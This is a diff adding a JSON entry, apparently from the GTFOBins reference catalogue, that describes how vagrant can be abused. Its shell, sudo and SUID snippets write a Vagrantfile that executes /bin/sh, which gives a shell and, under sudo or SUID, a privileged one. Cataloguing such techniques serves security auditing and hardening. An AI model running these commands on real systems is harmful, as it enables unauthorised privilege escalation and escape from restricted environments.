@@ -1,0 +1,20 @@
+{
+  "description": "This allows to execute [`ruby`](/gtfobins/ruby/) code, other functions may apply.",
+  "functions": {
+    "shell": [
+      {
+        "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up\n"
+      }
+    ]
+  }
+}
